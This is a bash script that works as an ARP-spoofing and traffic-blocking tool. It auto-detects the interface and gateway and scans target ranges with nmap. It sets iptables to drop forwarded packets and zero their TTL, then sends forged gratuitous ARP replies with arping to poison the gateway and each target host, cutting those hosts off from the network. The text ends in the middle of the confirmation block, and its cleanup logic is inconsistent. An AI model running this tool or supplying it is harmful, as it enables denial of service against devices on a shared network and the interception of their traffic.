#!/bin/bash


# Function to auto-detect interface
auto_detect_interface() {
    # Get the default route interface
    local interface=$(ip route | grep default | head -1 | awk '{print $5}' | head -1)

    if [[ -n "$interface" ]]; then
        echo "$interface"
    else
        # Fallback: get first non-loopback interface
        interface=$(ip link show | awk -F': ' '/^[0-9]+: [^lo]/ {print $2; exit}')
        echo "$interface"
    fi
}

# Function to auto-detect gateway
auto_detect_gateway() {
    # Get the default gateway
    local gateway=$(ip route | grep default | head -1 | awk '{print $3}')

    if [[ -z "$gateway" ]]; then
        # Fallback method
        gateway=$(route -n | grep '^0.0.0.0' | awk '{print $2}' | head -1)
    fi

    echo "$gateway"
}

# Function to get device IP
get_device_ip() {
    local interface=$1
    local device_ip=$(ip addr show "$interface" | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | head -1)
    echo "$device_ip"
}

# Function to expand CIDR to individual IPs
expand_cidr() {
    local cidr=$1
    local gateway=$2
    local device_ip=$3

    # Check if ipcalc is available
    if ! command -v ipcalc &> /dev/null; then
        echo "Error: ipcalc not found. Cannot expand CIDR ranges."
        return 1
    fi

    # Get network information
    local network=$(ipcalc -n "$cidr" | cut -d'=' -f2)
    local netmask=$(ipcalc -m "$cidr" | cut -d'=' -f2)

    # Generate IP range
    local start_ip=$(ipcalc -n "$cidr" | cut -d'=' -f2)
    local end_ip=$(ipcalc -b "$cidr" | cut -d'=' -f2)

    # Use nmap or seq to generate IPs (fallback method)
    if command -v nmap &> /dev/null; then
        nmap -sn "$cidr" -oG - | grep "Status: Up" | awk '{print $2}'
    else
        # Simple range expansion (works for smaller networks)
        ipcalc -n "$cidr" | grep -E "HostMin|HostMax" | cut -d':' -f2 | tr -d ' '
    fi
}

# Function to process targets (handle single IP, multiple IPs, CIDR)
process_targets() {
    local targets_input=$1
    local gateway=$2
    local device_ip=$3
    local interface=$4

    local target_list=()

    # Split input by spaces
    IFS=' ' read -ra TARGETS <<< "$targets_input"

    for target in "${TARGETS[@]}"; do
        # Check if it's a CIDR range
        if [[ "$target" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
            echo "Expanding CIDR range: $target"
            # For CIDR, get all IPs in the network
            local cidr_ips=$(nmap -sn "$target" 2>/dev/null | grep report | awk '{print $NF}' 2>/dev/null)
            if [[ -n "$cidr_ips" ]]; then
                while IFS= read -r ip; do
                    # Skip gateway and device IP
                    if [[ "$ip" != "$gateway" ]] && [[ "$ip" != "$device_ip" ]]; then
                        target_list+=("$ip")
                    fi
                done <<< "$cidr_ips"
            else
                # Fallback: manual CIDR expansion
                local base_ip=$(echo "$target" | cut -d'/' -f1)
                local prefix=$(echo "$target" | cut -d'/' -f2)
                echo "Warning: Could not expand CIDR $target automatically"
                target_list+=("$base_ip")  # Add base IP as fallback
            fi
        else
            # Single IP or multiple space-separated IPs
            # Skip gateway and device IP
            if [[ "$target" != "$gateway" ]] && [[ "$target" != "$device_ip" ]]; then
                target_list+=("$target")
            fi
        fi
    done

    # Return unique targets
    printf '%s\n' "${target_list[@]}" | sort -u
}

# Get interface
read -rp "Enter network interface (or press Enter to auto-detect): " INTERFACE
if [[ -z "$INTERFACE" ]]; then
    INTERFACE=$(auto_detect_interface)
    echo "Auto-detected interface: $INTERFACE"
fi

# Validate interface
if ! ip link show "$INTERFACE" &> /dev/null; then
    echo "Error: Interface '$INTERFACE' not found!"
    exit 1
fi

# Get device IP
DEVICE_IP=$(get_device_ip "$INTERFACE")
echo "Device IP: $DEVICE_IP"

# Get gateway
read -rp "Enter gateway IP (or press Enter to auto-detect): " GATEWAY
if [[ -z "$GATEWAY" ]]; then
    GATEWAY=$(auto_detect_gateway)
    echo "Auto-detected gateway: $GATEWAY"
fi

# Validate gateway format (allow empty gateway for auto-detection edge cases)
if [[ -n "$GATEWAY" ]] && [[ ! "$GATEWAY" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Error: Invalid gateway format!"
    exit 1
fi

# Get targets
echo "Enter target(s):"
echo "  - Single IP: 192.168.1.100"
echo "  - Multiple IPs: 192.168.1.100 192.168.1.101 192.168.1.102"
echo "  - CIDR range: 192.168.1.0/24"
echo "  - Mixed: 192.168.1.100 192.168.1.0/24 192.168.1.101"
read -rp "Target(s): " TARGETS_INPUT

if [[ -z "$TARGETS_INPUT" ]]; then
    echo "Error: Target(s) required!"
    exit 1
fi

# iptables policy
iptables -P FORWARD DROP
iptables -I FORWARD -j DROP

# Process targets
echo "Processing targets..."
PROCESSED_TARGETS=$(process_targets "$TARGETS_INPUT" "$GATEWAY" "$DEVICE_IP" "$INTERFACE")

if [[ -z "$PROCESSED_TARGETS" ]]; then
    echo "Error: No valid targets found!"
    exit 1
fi

echo
echo "Configuration:"
echo "  Interface:  $INTERFACE"
echo "  Device IP:  $DEVICE_IP"
echo "  Gateway IP  $GATEWAY"
echo " "
while IFS= read -r target; do
echo "  TARGET IP:  $target"
done <<< "$PROCESSED_TARGETS"
echo

# Drop hops
iptables -t mangle -I PREROUTING -i "$INTERFACE" -j TTL --ttl-set 0

# Cleanup
cat > /bin/spoofer-stop << EOF
#!/bin/bash

iptables -t mangle -I PREROUTING -i $INTERFACE -j TTL --ttl-set 64
iptables -P FORWARD ACCEPT
iptables -F FORWARD
EOF
chmod 755 /bin/spoofer-stop

# Confirm before executing
read -rp "Execute spoofer? (y/N): " CONFIRM
if [[ "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo "Starting ARP spoofing..."
    echo "Press Ctrl+C to stop"

    # Loop through each target and perform ARP spoofing
    while IFS= read -r target; do
        if [[ -n "$target" ]]; then
            echo "Spoofing target: $target"
            # Run arpspoof in background
            arping -b -A -i "$INTERFACE" -S "$target" "$GATEWAY" >/dev/null 2>&1 &
            arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 &
        fi
    done <<< "$PROCESSED_TARGETS"

    # stop
    echo " "
    echo "To stop, run: sudo spoofer-stop"
